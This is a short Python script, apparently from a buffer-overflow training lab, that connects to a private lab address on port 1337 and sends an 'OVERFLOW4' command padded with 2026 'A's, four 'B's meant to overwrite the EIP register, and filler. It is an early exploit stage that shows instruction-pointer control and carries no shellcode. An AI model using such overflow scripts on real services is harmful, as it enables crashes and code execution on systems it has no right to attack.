import socket
import sys
import time


print("[+] Nani???? EIP!!\n")

buff = "A" * 2026

eip = "B" * 4

fill = "C" * 70

#Final payload
payload = buff + eip + fill

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('10.10.154.225', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command
s.send('OVERFLOW4 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()
	
print("[+] Execution Finished")
